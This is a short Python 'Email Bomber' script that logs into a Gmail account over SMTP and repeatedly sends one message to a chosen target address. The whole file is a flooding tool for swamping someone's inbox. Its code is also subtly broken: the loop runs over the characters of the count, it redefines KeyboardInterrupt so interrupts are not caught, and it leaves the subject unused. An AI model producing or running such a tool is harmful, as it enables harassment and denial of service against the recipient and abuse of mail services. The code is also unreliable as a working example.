class Error(Exception):
	pass
class KeyboardInterrupt(Error):
	pass
	

import smtplib
import getpass
import sys
import time
import os

print ('                                                                    ')
print ('                                                                    ')
print ('            #################################################       ')
print ('            #                                               #       ')
print ('            #                 Email Bomber                  #       ')
print ('            #                                               #       ')
print ('            #               created By AdilShehzad          #       ')


print ('            #################################################       ')

print ('                                                                    ')


email=input('Enter Gmail Address:')
print('  ')
user = input('Anonymous name : ')
password=getpass.getpass('Enter Password:')
to=input('\nTo:')

print('  ')
body=input('Message:')
print('  ')
total=input('Number of Send:')



smtp_server='smtp.gmail.com'
port=587
print('  ')
try:
	server=smtplib.SMTP(smtp_server,port)
	server.ehlo()
	server.starttls()
	server.login(email,password)
	for i in enumerate(total): 

		subject=os.urandom(9)
		msg='From:' + user +'\nSubjects'+'\n'+body
		server.sendmail(email,to,msg)
		print("Email Sent")
		
		time.sleep(2)
		sys.stdout.flush()
	server.quit()
	print("job done")

except KeyboardInterrupt:

    print("Error")
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print ('\n[!] The username or password you entered is incorrect.')
sys.exit()